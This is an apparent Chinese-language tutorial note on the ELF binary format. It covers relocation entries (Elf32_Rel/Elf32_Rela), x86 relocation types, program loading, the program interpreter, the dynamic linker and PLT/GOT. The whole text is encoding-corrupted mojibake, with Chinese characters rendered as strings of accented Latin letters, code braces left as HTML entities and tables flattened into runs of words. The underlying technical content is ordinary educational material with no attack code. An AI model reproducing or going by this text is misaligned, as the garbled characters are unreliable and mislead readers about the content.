æœªèƒ½è§£æçš„å¼±ç¬¦å·å–å€¼ä¸º0ã€‚ åœ¨æ¯ä¸ªç¬¦å·è¡¨ä¸­ï¼Œæ‰€æœ‰å…·æœ‰ STB_LOCALç»‘å®šçš„ç¬¦å·éƒ½ä¼˜å…ˆäºå¼±ç¬¦å·å’Œå…¨å±€ç¬¦å·ã€‚ç¬¦å·è¡¨èŠ‚åŒºä¸­çš„ sh_info å¤´éƒ¨æˆå‘˜åŒ…å«ç¬¬ä¸€ä¸ªéå±€éƒ¨ç¬¦å·çš„ç¬¦å·è¡¨ç´¢å¼•ã€‚ ğŸ™‚æœ‰ç‚¹ä¸å¤ªæ‡‚ï¼Œæ¶‰åŠè¿™éƒ¨åˆ†çš„å†…å®¹éœ€è¦å›å¤´åœ¨çœ‹ é‡å®šä½ é‡å®šä½å°±æ˜¯å°†ç¬¦å·å®šä¹‰å’Œç¬¦å·å¼•ç”¨è¿›è¡Œè¿æ¥çš„è¿‡ç¨‹ã€‚å¯é‡å®šä½æ–‡ä»¶éœ€è¦åŒ…å«æè¿°å¦‚ä½•ä¿®æ”¹èŠ‚å†…å®¹çš„ç›¸å…³ä¿¡æ¯ï¼Œä»è€Œä½¿å¾—å¯æ‰§è¡Œæ–‡ä»¶å’Œå…±äº«ç›®æ ‡æ–‡ä»¶èƒ½å¤Ÿä¿å­˜è¿›ç¨‹çš„ç¨‹åºé•œåƒæ‰€éœ€çš„æ­£ç¡®ä¿¡æ¯ã€‚é‡å®šä½æ¡ç›®å°±æ˜¯æˆ‘ä»¬ä¸Šé¢è¯´çš„ç›¸å…³ä¿¡æ¯ã€‚ æˆ‘ä»¬é¦–å…ˆä»‹ç»äº†ç¬¦å·å’ŒèŠ‚ç›¸å…³çš„å†…å®¹ï¼Œå› ä¸ºæ¥ä¸‹æ¥è¦è®¨è®ºçš„é‡å®šä½è¿‡ç¨‹éœ€è¦ä¾èµ–ç¬¦å·å’ŒèŠ‚ã€‚åœ¨é‡å®šä½æ–‡ä»¶ä¸­ï¼Œé‡å®šä½è®°å½•ä¿å­˜äº†å¦‚ä½•å¯¹ç»™å®šçš„ç¬¦å·å¯¹åº”ä»£ç è¿›è¡Œè¡¥å……çš„ç›¸å…³ä¿¡æ¯ã€‚é‡å®šä½å®é™…ä¸Šæ˜¯ä¸€ç§ç»™äºŒè¿›åˆ¶æ–‡ä»¶æ‰“è¡¥ä¸çš„æœºåˆ¶ï¼Œå¦‚æœä½¿ç”¨äº†åŠ¨æ€é“¾æ¥å™¨ï¼Œå¯ä»¥ä½¿ç”¨é‡å®šä½åœ¨å†…å­˜ä¸­æ‰“çƒ­è¡¥ä¸ï¼ˆhotfixï¼‰ã€‚ç”¨äºåˆ›å»ºå¯æ‰§è¡Œæ–‡ä»¶å’Œå…±äº«åº“çš„é“¾æ¥ç¨‹åº/bin/ldï¼Œéœ€è¦æŸç§ç±»å‹çš„å…ƒæ•°æ®æ¥æè¿°å¦‚ä½•å¯¹ç‰¹å®šçš„æŒ‡ä»¤è¿›è¡Œä¿®æ”¹ã€‚è¿™ç§å…ƒæ•°æ®å°±å­˜æ”¾åœ¨å‰é¢æåˆ°çš„é‡å®šä½è®°å½•ä¸­ã€‚ ä¸¾ä¸ªæ —å­: å‡è®¾è¦å°†ä¸¤ä¸ªç›®æ ‡æ–‡ä»¶é“¾æ¥åˆ°ä¸€èµ·äº§ç”Ÿä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ã€‚obj1.oæ–‡ä»¶ä¸­å­˜æ”¾äº†è°ƒç”¨å‡½æ•°foo()çš„ä»£ç ï¼Œè€Œå‡½æ•°foo()æ˜¯å­˜æ”¾åœ¨ç›®æ ‡æ–‡ä»¶obj2.oä¸­çš„ã€‚é“¾æ¥ç¨‹åºä¼šå¯¹obj1.oå’Œobj2.oä¸­çš„é‡å®šä½è®°å½•è¿›è¡Œåˆ†æå¹¶å°†è¿™ä¸¤ä¸ªæ–‡ä»¶é“¾æ¥åœ¨ä¸€èµ·äº§ç”Ÿä¸€ä¸ªå¯ä»¥ç‹¬ç«‹è¿è¡Œçš„å¯æ‰§è¡Œç¨‹åºã€‚ç¬¦å·å¼•ç”¨ä¼šè¢«è§£ææˆç¬¦å·å®šä¹‰ï¼Œè¿™æ˜¯ä»€ä¹ˆæ„æ€å‘¢ï¼Ÿç›®æ ‡æ–‡ä»¶æ˜¯å¯é‡å®šä½çš„ä»£ç ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œç›®æ ‡æ–‡ä»¶ä¸­çš„ä»£ç ä¼šè¢«é‡å®šä½åˆ°å¯æ‰§è¡Œæ–‡ä»¶çš„æ®µä¸­ä¸€ä¸ªç»™å®šçš„åœ°å€ã€‚åœ¨è¿›è¡Œé‡å®šä½ä¹‹å‰ï¼Œæ— æ³•ç¡®å®šobj1.oæˆ–è€…obj2.oä¸­çš„ç¬¦å·å’Œä»£ç åœ¨å†…å­˜ä¸­çš„ä½ç½®ï¼Œå› æ­¤æ— æ³•è¿›è¡Œå¼•ç”¨ã€‚åªèƒ½åœ¨é“¾æ¥å™¨ç¡®å®šäº†å¯æ‰§è¡Œæ–‡ä»¶çš„æ®µä¸­å­˜æ”¾çš„æŒ‡ä»¤æˆ–è€…ç¬¦å·çš„ä½ç½®ä¹‹åæ‰èƒ½å¤Ÿè¿›è¡Œä¿®æ”¹ã€‚ é‡å®šä½è¡¨ ä¸‹é¢æ˜¯é‡å®šä½è¡¨é¡¹çš„æ•°æ®ç»“æ„ï¼ˆ32ä½ä¸ºä¾‹ï¼‰ 123456789typedef struct &#123; Elf32_Addr r_offset; Elf32_Word r_info; &#125; Elf32_Rel; typedef struct &#123; Elf32_Addr r_offset; Elf32_Word r_info; Elf32_Word r_addend; &#125; Elf32_Rela é‡å®šä½è¡¨å­—æ®µè¯´æ˜ æˆå‘˜ è¯´æ˜ r_offset æ­¤æˆå‘˜ç»™å‡ºäº†é‡å®šä½åŠ¨ä½œæ‰€é€‚ç”¨çš„ä½ç½®ã€‚å¯¹äºä¸€ä¸ªå¯é‡å®šä½æ–‡ä»¶è€Œè¨€ï¼Œæ­¤å€¼æ˜¯ä»èŠ‚åŒºå¤´éƒ¨å¼€å§‹åˆ°å°†è¢«é‡å®šä½å½±å“çš„å­˜å‚¨å•ä½ä¹‹é—´çš„å­—èŠ‚åç§»ã€‚å¯¹äºå¯æ‰§è¡Œæ–‡ä»¶æˆ–è€…å…±äº«ç›®æ ‡æ–‡ä»¶è€Œè¨€ï¼Œå…¶å–å€¼æ˜¯è¢«é‡å®šä½å½±å“åˆ°çš„å­˜å‚¨å•å…ƒçš„è™šæ‹Ÿåœ°å€ã€‚ r_info æ­¤æˆå‘˜ç»™å‡ºè¦è¿›è¡Œé‡å®šä½çš„ç¬¦å·è¡¨ç´¢å¼•ï¼Œä»¥åŠå°†å®æ–½çš„é‡å®šä½ç±»å‹ã€‚ä¾‹å¦‚ä¸€ä¸ªè°ƒç”¨æŒ‡ä»¤çš„é‡å®šä½é¡¹å°†åŒ…å«è¢«è°ƒç”¨å‡½æ•°çš„ç¬¦å·è¡¨ç´¢å¼•ã€‚å¦‚æœç´¢å¼•æ˜¯ STN_UNDEFï¼Œé‚£ä¹ˆé‡å®šä½ä½¿ç”¨ 0 ä½œä¸ºâ€œç¬¦å·å€¼â€ã€‚é‡å®šä½ç±»å‹æ˜¯å’Œå¤„ç†å™¨ç›¸å…³çš„ã€‚å½“ç¨‹åºä»£ç å¼•ç”¨ä¸€ä¸ªé‡å®šä½é¡¹çš„é‡å®šä½ç±»å‹æˆ–è€…ç¬¦å·è¡¨ç´¢å¼•ï¼Œåˆ™è¡¨ç¤ºå¯¹è¡¨é¡¹çš„ r_info æˆå‘˜åº”ç”¨ ELF32_R_TYPE æˆ–è€… ELF32_R_SYM çš„ç»“æœã€‚ r_addend æ­¤æˆå‘˜ç»™å‡ºä¸€ä¸ªå¸¸é‡è¡¥é½ï¼Œç”¨æ¥è®¡ç®—å°†è¢«å¡«å……åˆ°å¯é‡å®šä½å­—æ®µçš„æ•°å€¼ é‡å®šä½èŠ‚åŒºä¼šå¼•ç”¨ä¸¤ä¸ªå…¶å®ƒèŠ‚åŒºï¼šç¬¦å·è¡¨ã€è¦ä¿®æ”¹çš„èŠ‚åŒºã€‚èŠ‚åŒºå¤´éƒ¨çš„sh_infoå’Œsh_linkæˆå‘˜ç»™å‡ºè¿™äº›å…³ç³»ã€‚ä¸åŒç›®æ ‡æ–‡ä»¶çš„é‡å®šä½è¡¨é¡¹å¯¹r_offsetæˆå‘˜å…·æœ‰ç•¥å¾®ä¸åŒçš„è§£é‡Šã€‚ (1).åœ¨å¯é‡å®šä½æ–‡ä»¶ä¸­ï¼Œr_offsetä¸­åŒ…å«èŠ‚åŒºåç§»ã€‚å°±æ˜¯è¯´é‡å®šä½èŠ‚åŒºè‡ªèº«æè¿°äº†å¦‚ä½•ä¿®æ”¹æ–‡ä»¶ä¸­çš„å…¶ä»–èŠ‚åŒºï¼›é‡å®šä½åç§» æŒ‡å®šäº†è¢«ä¿®æ”¹èŠ‚åŒºä¸­çš„ä¸€ä¸ªå­˜å‚¨å•å…ƒã€‚ (2).åœ¨å¯æ‰§è¡Œæ–‡ä»¶å’Œå…±äº«çš„ç›®æ ‡æ–‡ä»¶ä¸­ï¼Œr_offsetä¸­åŒ…å«ä¸€ä¸ªè™šæ‹Ÿåœ°å€ã€‚ä¸ºäº†ä½¿å¾—è¿™äº›æ–‡ä»¶çš„é‡å®šä½è¡¨é¡¹å¯¹åŠ¨æ€é“¾æ¥å™¨æ›´ä¸ºæœ‰ç”¨ï¼ŒèŠ‚åŒºåç§»ï¼ˆé’ˆå¯¹æ–‡ä»¶çš„è§£é‡Šï¼‰è®©ä½äºè™šåœ°å€ï¼ˆé’ˆå¯¹å†…å­˜çš„è§£é‡Šï¼‰ã€‚ å°½ç®¡å¯¹ r_offset çš„è§£é‡Šä¼šæœ‰å°‘è®¸ä¸åŒï¼Œé‡å®šä½ç±»å‹çš„å«ä¹‰å§‹ç»ˆä¸å˜ã€‚ é‡å®šä½ç±»å‹ é‡å®šä½è¡¨é¡¹æè¿°å¦‚ä½•ä¿®æ”¹åé¢çš„æŒ‡ä»¤å’Œæ•°æ®å­—æ®µã€‚ä¸€èˆ¬ï¼Œå…±äº«ç›®æ ‡æ–‡ä»¶åœ¨åˆ›å»ºæ—¶ï¼Œå…¶åŸºæœ¬è™šæ‹Ÿåœ°å€æ˜¯0ï¼Œä¸è¿‡æ‰§è¡Œåœ°å€å°†éšç€åŠ¨æ€åŠ è½½è€Œå‘ç”Ÿå˜åŒ–ã€‚ é‡å®šä½çš„è¿‡ç¨‹æŒ‰ç…§å¦‚ä¸‹æ ‡è®°ï¼š A ç”¨æ¥è®¡ç®—å¯é‡å®šä½å­—æ®µçš„å–å€¼çš„è¡¥é½ B å…±äº«ç›®æ ‡åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œé‡å®šä½é¡¹çš„ç¬¦å·çš„åœ°å€æ‰€å¤„çš„ä½ç½® â€”å…¨å±€åç§»è¡¨çš„ç´¢å¼• GOT å…¨å±€åç§»è¡¨(GOT)çš„åœ°å€ L æŸä¸ªç¬¦å·çš„è¿‡ç¨‹é“¾æ¥è¡¨é¡¹çš„ä½ç½®ï¼ˆèŠ‚åŒºåç§»åœ°å€ï¼‰ã€‚è¿‡ç¨‹è¿æ¥è¡¨é¡¹æŠŠå‡½æ•°è°ƒç”¨é‡å®šä½åˆ°æ­£ç¡®çš„ç›®æ ‡ä½ç½®ã€‚é“¾æ¥ç¼–è¾‘å™¨æ„é€ åˆå§‹çš„è¿‡ç¨‹é“¾æ¥è¡¨ï¼ŒåŠ¨æ€é“¾æ¥å™¨åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ä¿®æ”¹è¿™äº›é¡¹ç›®ã€‚ P å­˜å‚¨å•ä½è¢«é‡å®šä½ï¼ˆç”¨r_offsetè®¡ç®—ï¼‰åˆ°çš„ä½ç½®ï¼ˆèŠ‚åŒºåç§»æˆ–è€…åœ°å€ï¼‰ S å…¶ç´¢å¼•ä½äºé‡å®šä½è¡¨é¡¹ä¸­çš„ç¬¦å·å–å€¼ é‡å®šä½é¡¹çš„ r_offset å–å€¼ç»™å®šå—å½±å“çš„å­˜å‚¨å•ä½çš„ç¬¬ä¸€ä¸ªå­—èŠ‚çš„åç§»æˆ–è€…è™šæ‹Ÿåœ°å€ã€‚é‡å®šä½ç±»å‹ç»™å‡ºé‚£äº›ä½éœ€è¦ä¿®æ”¹ä»¥åŠå¦‚ä½•è®¡ç®—å®ƒä»¬çš„å–å€¼ã€‚ SYSTEM Vä»…ä½¿ç”¨Elf32_Relé‡å®šä½è¡¨é¡¹ï¼Œåœ¨è¢«é‡å®šä½çš„å­—æ®µä¸­åŒ…å«è¡¥é½é‡ã€‚è¡¥é½é‡å’Œè®¡ç®—ç»“æœå§‹ç»ˆé‡‡ç”¨ç›¸åŒçš„å­—èŠ‚é¡ºåºã€‚ X86ä½“ç³»ç»“æ„ä¸‹å¸¸è§é‡å®šä½ç±»å‹ï¼š åç§° æ•°å€¼ å­—æ®µ è®¡ç®— è¯´æ˜ R_386_NONE 0 none none R_386_32 1 word32 S+A R_386_PC32 2 word32 S+A-P R_386_GOT32 3 word32 G+A-P æ­¤é‡å®šä½ç±»å‹è®¡ç®—ä»å…¨å±€åç§»è¡¨åŸºå€åˆ°ç¬¦å·çš„å…¨å±€åç§»è¡¨é¡¹ä¹‹é—´çš„è·ç¦»ã€‚å®ƒä¼šé€šçŸ¥è¿æ¥ç¼–è¾‘å™¨æ„é€ ä¸€ä¸ªå…¨å±€åç§»è¡¨ã€‚ R_386_PLT32 4 word32 L+A-P æ­¤é‡å®šä½ç±»å‹è®¡ç®—ç¬¦å·çš„è¿‡ç¨‹é“¾æ¥è¡¨é¡¹çš„åœ°è´¨ï¼Œå¹¶é€šçŸ¥é“¾æ¥ç¼–è¾‘å™¨æ„é€ ä¸€ä¸ªè¿‡ç¨‹é“¾æ¥è¡¨ã€‚ R_386_COPY 5 word32 none é“¾æ¥ç¼–è¾‘å™¨åˆ›å»ºè¿™ç§é‡å®šä½ç±»å‹çš„ç›®çš„æ˜¯æ”¯æŒåŠ¨æ€é“¾æ¥ã€‚å…¶åç§»é‡æˆå‘˜å¼•ç”¨æŸä¸ªå¯å†™æ®µä¸­çš„æŸä¸ªä½ç½®ã€‚ç¬¦å·è¡¨ç´¢å¼•è§„å®šç¬¦å·åº”è¯¥æ—¢å­˜åœ¨äºå½“å‰ç›®æ ‡æ–‡ä»¶ä¸­ï¼Œä¹Ÿå­˜åœ¨äºæŸä¸ªå…±äº«ç›®æ ‡ä¸­ã€‚åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼ŒåŠ¨æ€é“¾æ¥å™¨æŠŠä¸å…±äº«ç›®æ ‡çš„ç¬¦å·ç›¸å…³çš„æ•°æ®å¤åˆ¶åˆ°ç”±åç§»ç»™å‡ºçš„ä½ç½®ã€‚ R_386_GLOB_DAT 6 word32 S æ­¤é‡å®šä½ç±»å‹ç”¨æ¥æŠŠæŸä¸ªå…¨å±€åç§»è¡¨é¡¹è®¾ç½®ä¸ºç»™å®šç¬¦å·çš„åœ°å€ã€‚è¿™ç§ç‰¹æ®Šçš„é‡å®šä½ç±»å‹å…è®¸ç¡®å®šç¬¦å·ä¸å…¨å±€åç§»è¡¨é¡¹ä¹‹é—´çš„å…³ç³»ã€‚ R_386_JMP_SLOT 7 word32 S é“¾æ¥ç¼–è¾‘å™¨åˆ›å»ºè¿™ç§é‡å®šä½ç±»å‹ä¸»è¦æ˜¯ä¸ºäº†æ”¯æŒåŠ¨æ€é“¾æ¥ã€‚å…¶åç§»åœ°å€æˆå‘˜ç»™å‡ºè¿‡ç¨‹é“¾æ¥è¡¨é¡¹çš„ä½ç½®ã€‚åŠ¨æ€é“¾æ¥å™¨ä¿®æ”¹è¿‡ç¨‹é“¾æ¥è¡¨é¡¹çš„å†…å®¹ï¼ŒæŠŠæ§åˆ¶ä¼ è¾“ç»™æŒ‡å®šç¬¦å·çš„åœ°å€ã€‚ R_386_RELATIVE 8 word32 B+A é“¾æ¥ç¼–è¾‘å™¨åˆ›å»ºè¿™ç§é‡å®šä½ç±»å‹æ˜¯ä¸ºäº†æ”¯æŒåŠ¨æ€é“¾æ¥ã€‚å…¶åç§»åœ°å€æˆå‘˜ç»™å‡ºå…±äº«ç›®æ ‡ä¸­çš„ä¸€ä¸ªä½ç½®ï¼Œåœ¨è¯¥ä½ç½®åŒ…å«äº†ä»£è¡¨ç›¸å¯¹åœ°å€çš„ä¸€ä¸ªæ•°å€¼ã€‚åŠ¨æ€é“¾æ¥å™¨é€šè¿‡æŠŠå…±äº«ç›®æ ‡è¢«åŠ è½½åˆ°çš„è™šåœ°å€å’Œç›¸å¯¹åœ°å€ç›¸åŠ ï¼Œè®¡ç®—å¯¹åº”çš„è™šåœ°å€ã€‚è¿™ç§ç±»å‹çš„é‡å®šä½é¡¹å¿…é¡»è®¾ç½®ç¬¦å·è¡¨ç´¢å¼•ä¸º 0ã€‚ R_386_GOTOFF 9 word32 S+A-GOT è¿™ç§é‡å®šä½ç±»å‹ä¼šè®¡ç®—ç¬¦å·å–å€¼ä¸å…¨å±€åç§»è¡¨åœ°å€é—´çš„å·®ã€‚å¹¶é€šçŸ¥é“¾æ¥ç¼–è¾‘å™¨åˆ›å»ºä¸€ä¸ªå…¨å±€åç§»è¡¨ã€‚ R_386_GOTPC 10 word32 GOT+A-P æ­¤é‡å®šä½ç±»å‹ä¸ R386_PC32 ç±»ä¼¼ï¼Œåªä¸è¿‡å®ƒåœ¨è®¡ç®—æ—¶é‡‡ç”¨å…¨å±€åç§»è¡¨çš„åœ°å€ã€‚åœ¨æ­¤é‡å®šä½é¡¹ä¸­å¼•ç”¨çš„ç¬¦å·é€šå¸¸æ˜¯_GLOBAL_OFFSET_TABLEï¼Œè¿™ç§ç±»å‹ä¹Ÿä¼šæš—ç¤ºè¿æ¥ç¼–è¾‘å™¨æ„é€ å…¨å±€åç§»è¡¨ã€‚ ç¨‹åºåŠ è½½å’ŒåŠ¨æ€é“¾æ¥è¿™éƒ¨åˆ†å†…å®¹å°†ç¬¦å·ã€é‡å®šä½å’ŒèŠ‚åœ¨ELFæ ¼å¼æ–‡ä»¶çš„åŒä¸€ä¸ªæŠ½è±¡å±‚æ¬¡ä¸Šç´§å¯†è”ç³»èµ·æ¥ã€‚ ç¨‹åºåŠ è½½ è¿›ç¨‹é™¤éåœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­å¼•ç”¨åˆ°ç›¸åº”çš„é€»è¾‘é¡µé¢ï¼Œå¦åˆ™ä¸ä¼šè¯·æ±‚çœŸæ­£çš„ç‰©ç†é¡µé¢ã€‚è¿›ç¨‹é€šå¸¸ä¼šåŒ…å«å¾ˆå¤šæœªå¼•ç”¨çš„é¡µé¢ï¼Œå› æ­¤ï¼Œå»¶è¿Ÿç‰©ç†è¯»æ“ä½œé€šå¸¸ä¼šé¿å…è¿™ç±»è´¹åŠ›ä¸è®¨å¥½çš„äº‹æƒ…å‘ç”Ÿï¼Œä»è€Œæé«˜ç³»ç»Ÿæ€§èƒ½ã€‚è¦æƒ³å®é™…è·å¾—è¿™ç§æ•ˆç‡ï¼Œå¯æ‰§è¡Œæ–‡ä»¶å’Œå…±äº«ç›®æ ‡æ–‡ä»¶å¿…é¡»å…·æœ‰è¿™æ ·çš„æ®µï¼šå…¶æ–‡ä»¶åç§»å’Œè™šæ‹Ÿåœ°å€å¯¹é¡µé¢å¤§å°å–æ¨¡åä½™æ•°ç›¸åŒ Demo: â€‹ å¯æ‰§è¡Œæ–‡ä»¶å¸ƒå±€ç¤ºä¾‹ è¯¥å¯æ‰§è¡Œæ–‡ä»¶å¤´éƒ¨æ®µç¤ºä¾‹å¦‚ä¸‹ï¼š è¿™ä¸ªä¾‹å­ä¸­ï¼Œè‡³å¤šå››ä¸ªæ–‡ä»¶é¡µé¢åŒ…å«éçº¯ç²¹çš„æ­£æ–‡æˆ–æ•°æ® ç¬¬ä¸€ä¸ªé¡µé¢åŒ…å«ELFå¤´éƒ¨ã€ç¨‹åºå¤´éƒ¨è¡¨ä»¥åŠå…¶ä»–ä¿¡æ¯ æœ€åä¸€ä¸ªé¡µé¢åŒ…å«æ•°æ®å¼€å§‹éƒ¨åˆ†çš„ä¸€ä¸ªå‰¯æœ¬ ç¬¬ä¸€æ•°æ®é¡µé¢åŒ…å«æ­£æ–‡æ®µçš„æœ«å°¾éƒ¨åˆ† æœ€åä¸€ä¸ªæ•°æ®é¡µé¢å¯èƒ½åŒ…å«ä¸è¿è¡Œè¿›ç¨‹æ— å…³çš„æ–‡ä»¶ä¿¡æ¯ æ“ä½œç³»ç»Ÿä¸€èˆ¬ä¼šå¯¹è¿™äº›é¡µé¢åšä¸¤æ¬¡æ˜ å°„ï¼Œä»¥ä¿è¯æ¯ä¸ªæ®µçš„å†…å­˜è®¿é—®è®¸å¯æ˜¯ç›¸åŒçš„ã€‚æ•°æ®æ®µçš„æœ«å°¾éœ€è¦å¯¹æœªåˆå§‹åŒ–æ•°æ®è¿›è¡Œç‰¹æ®Šå¤„ç†ï¼Œç³»ç»Ÿåº”è¯¥å°†è¿™äº›åˆå§‹åŒ–ä¸º0 å¯æ‰§è¡Œæ–‡ä»¶ä¸å…±äº«ç›®æ ‡æ–‡ä»¶ä¹‹é—´çš„æ®µåŠ è½½ä¹‹é—´æœ‰ä¸€ç‚¹ä¸åŒã€‚å¯æ‰§è¡Œæ–‡ä»¶çš„æ®µé€šå¸¸åŒ…å«ç»å¯¹ä»£ç ï¼Œä¸ºäº†èƒ½å¤Ÿè®©è¿›ç¨‹æ­£ç¡®æ‰§è¡Œï¼Œæ‰€ä½¿ç”¨çš„æ®µå¿…é¡»æ˜¯æ„é€ å¯æ‰§è¡Œæ–‡ä»¶æ—¶æ‰€ä½¿ç”¨çš„è™šæ‹Ÿåœ°å€ã€‚å› æ­¤ç³»ç»Ÿä¼šä½¿ç”¨p_vaddrä½œä¸ºè™šæ‹Ÿåœ°å€ã€‚ å¦å¤–ï¼Œå…±äº«ç›®æ ‡æ–‡ä»¶çš„æ®µé€šå¸¸åŒ…å«ä¸ä½ç½®æ— å…³çš„ä»£ç ã€‚è¿™ä½¿å¾—æ®µçš„è™šæ‹Ÿåœ°å€åœ¨ä¸åŒçš„è¿›ç¨‹ä¸­ä¸åŒï¼Œä½†ä¸å½±å“æ‰§è¡Œè¡Œä¸ºã€‚å°½ç®¡ç³»ç»Ÿä¸ºæ¯ä¸ªè¿›ç¨‹é€‰æ‹©ç‹¬ç«‹çš„è™šæ‹Ÿåœ°å€ï¼Œä»èƒ½ç»´æŒæ®µçš„ç›¸å¯¹ä½ç½®ã€‚å› ä¸ºä½ç½®ç‹¬ç«‹çš„ä»£ç åœ¨æ®µä¸æ®µä¹‹é—´ä½¿ç”¨ç›¸å¯¹å¯»å€ï¼Œå†…å­˜è™šåœ°å€ä¹‹é—´çš„å·®å¼‚å¿…é¡»ä¸æ–‡ä»¶ä¸­è™šæ‹Ÿåœ°å€ä¹‹é—´çš„å·®å¼‚ç›¸åŒ¹é…ã€‚ ç¨‹åºè§£é‡Šå™¨ å¯æ‰§è¡Œæ–‡ä»¶å¯ä»¥åŒ…å«PT_INTERPç¨‹åºå¤´éƒ¨å…ƒç´ ã€‚åœ¨exec() æœŸé—´ï¼Œç³»ç»Ÿä»PT_INTERPæ®µä¸­æ£€ç´¢è·¯å¾„åï¼Œå¹¶ä»è§£é‡Šå™¨æ–‡ä»¶çš„æ®µåˆ›å»ºåˆå§‹çš„è¿›ç¨‹æ˜ åƒã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œç³»ç»Ÿå¹¶ä¸ä½¿ç”¨åŸæ¥å¯æ‰§è¡Œæ–‡ä»¶çš„æ®µæ˜ åƒï¼Œè€Œæ˜¯ä¸ºè§£é‡Šå™¨æ„é€ ä¸€ä¸ªå†…å­˜æ˜ åƒã€‚æ¥ä¸‹æ¥æ˜¯è§£é‡Šå™¨ä»ç³»ç»Ÿæ¥æ”¶æ§åˆ¶ï¼Œä¸ºåº”ç”¨ç¨‹åºæä¾›æ‰§è¡Œç¯å¢ƒã€‚ è§£é‡Šå™¨å¯ä»¥æœ‰ä¸¤ç§æ–¹å¼æ¥å—æ§åˆ¶ï¼š æ¥å—ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼Œè¯»å–å¯æ‰§è¡Œæ–‡ä»¶å¹¶å°†å…¶æ˜ å°„åˆ°å†…å­˜ä¸­ æ ¹æ®å¯æ‰§è¡Œæ–‡ä»¶çš„æ ¼å¼ï¼Œç³»ç»Ÿå¯èƒ½æŠŠå¯æ‰§è¡Œæ–‡ä»¶åŠ è½½åˆ°å†…å­˜ä¸­ï¼Œè€Œä¸æ˜¯ä¸ºè§£é‡Šå™¨æä¾›ä¸€ä¸ªå·²ç»æ‰“å¼€çš„æ–‡ä»¶æè¿°ç¬¦ã€‚ å…±äº«ç›®æ ‡æ–‡ä»¶è¢«åŠ è½½åˆ°å†…å­˜ä¸­æ—¶ï¼Œå…¶åœ°å€å¯èƒ½åœ¨å„ä¸ªè¿›ç¨‹ä¸­å‘ˆç°ä¸åŒçš„å–å€¼ã€‚ç³»ç»Ÿåœ¨ mmap ä»¥åŠç›¸å…³æœåŠ¡æ‰€ä½¿ç”¨çš„åŠ¨æ€æ®µåŒºåŸŸåˆ›å»ºå…±äº«ç›®æ ‡æ–‡ä»¶çš„æ®µã€‚å› æ­¤ï¼Œå…±äº«ç›®æ ‡è§£é‡Šå™¨é€šå¸¸ä¸ä¼šä¸åŸæ¥çš„å¯æ‰§è¡Œæ–‡ä»¶çš„åŸå§‹æ®µåœ°å€å‘ç”Ÿå†²çªã€‚ å¯æ‰§è¡Œæ–‡ä»¶è¢«åŠ è½½åˆ°å†…å­˜ä¸­å›ºå®šåœ°å€ï¼Œç³»ç»Ÿä½¿ç”¨æ¥è‡ªå…¶ç¨‹åºå¤´éƒ¨è¡¨çš„è™šæ‹Ÿåœ°å€åˆ›å»ºå„ä¸ªæ®µã€‚å› æ­¤ï¼Œå¯æ‰§è¡Œæ–‡ä»¶è§£é‡Šå™¨çš„è™šæ‹Ÿåœ°å€å¯èƒ½ä¼šä¸åŸæ¥çš„å¯æ‰§è¡Œæ–‡ä»¶çš„è™šæ‹Ÿåœ°å€å‘ç”Ÿå†²çªã€‚è§£é‡Šå™¨è¦è´Ÿè´£è§£å†³è¿™ç§å†²çªã€‚ åŠ¨æ€åŠ è½½ç¨‹åº åœ¨æ„é€ ä½¿ç”¨åŠ¨æ€é“¾æ¥æŠ€æœ¯çš„å¯æ‰§è¡Œæ–‡ä»¶æ—¶ï¼Œè¿æ¥ç¼–è¾‘å™¨å‘å¯æ‰§è¡Œæ–‡ä»¶ä¸­æ·»åŠ ä¸€ä¸ªç±»å‹ä¸ºPT_INTERPçš„ç¨‹åºå¤´éƒ¨å…ƒç´ ï¼Œå‘Šè¯‰ç³»ç»Ÿè¦æŠŠåŠ¨æ€é“¾æ¥å™¨æ¿€æ´»ï¼Œä½œä¸ºç¨‹åºè§£é‡Šå™¨ã€‚ç³»ç»Ÿæ‰€æä¾›çš„åŠ¨æ€é“¾æ¥å™¨çš„ä½ç½®æ˜¯å’Œå¤„ç†å™¨ç›¸å…³çš„ã€‚ Exec() å’ŒåŠ¨æ€é“¾æ¥å™¨åˆä½œï¼Œä¸ºç¨‹åºåˆ›å»ºè¿›ç¨‹æ˜ åƒï¼Œå…¶ä¸­åŒ…æ‹¬ä»¥ä¸‹åŠ¨ä½œï¼š (1).å°†å¯æ‰§è¡Œæ–‡ä»¶çš„å†…å­˜æ®µæ·»åŠ åˆ°è¿›ç¨‹æ˜ åƒä¸­ï¼› (2).æŠŠå…±äº«ç›®æ ‡å†…å­˜æ®µæ·»åŠ åˆ°è¿›ç¨‹æ˜ åƒä¸­ï¼› (3).ä¸ºå¯æ‰§è¡Œæ–‡ä»¶å’Œå®ƒçš„å…±äº«ç›®æ ‡æ‰§è¡Œé‡å®šä½æ“ä½œï¼› (4).å…³é—­ç”¨æ¥è¯»å…¥å¯æ‰§è¡Œæ–‡ä»¶çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œå¦‚æœåŠ¨æ€é“¾æ¥ç¨‹åºæ”¶åˆ°è¿‡è¿™æ ·çš„æ–‡ä»¶æè¿°ç¬¦çš„è¯ï¼› (5).å°†æ§åˆ¶è½¬äº¤ç»™ç¨‹åºï¼Œä½¿å¾—ç¨‹åºå¥½åƒä» exec ç›´æ¥å¾—åˆ°æ§åˆ¶ã€‚ PLT&amp;GOT ä½ç½®ç‹¬ç«‹çš„ä»£ç ä¸€èˆ¬ä¸èƒ½åŒ…å«ç»å¯¹çš„è™šæ‹Ÿåœ°å€ã€‚å…¨å±€åç§»è¡¨åœ¨ç§æœ‰æ•°æ®ä¸­åŒ…å«ç»å¯¹åœ°å€ï¼Œä»è€Œä½¿å¾—åœ°å€å¯ç”¨ï¼Œå¹¶ä¸”ä¸ä¼šå½±å“ä½ç½®ç‹¬ç«‹æ€§å’Œç¨‹åºä»£ç çš„å¯å…±äº«æ€§ã€‚ç¨‹åºä½¿ç”¨ä½ç½®ç‹¬ç«‹çš„å¯»å€å¼•ç”¨å…¶å…¨å±€åç§»è¡¨ï¼Œå¹¶å–å¾—ç»å¯¹å€¼ï¼Œä»è€ŒæŠŠä½ç½®ç‹¬ç«‹çš„å¼•ç”¨é‡å®šå‘åˆ°ç»å¯¹ä½ç½®ã€‚ 